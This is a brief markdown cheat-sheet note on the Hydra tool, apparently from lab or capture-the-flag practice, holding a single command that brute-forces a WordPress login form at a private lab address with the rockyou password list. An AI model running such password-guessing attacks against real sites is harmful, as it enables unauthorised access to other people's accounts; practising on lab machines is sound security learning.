# hydra

## Hydra Usage

### Post attack

`hydra -l notch -P /usr/share/wordlists/rockyou.txt 10.10.10.37 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`

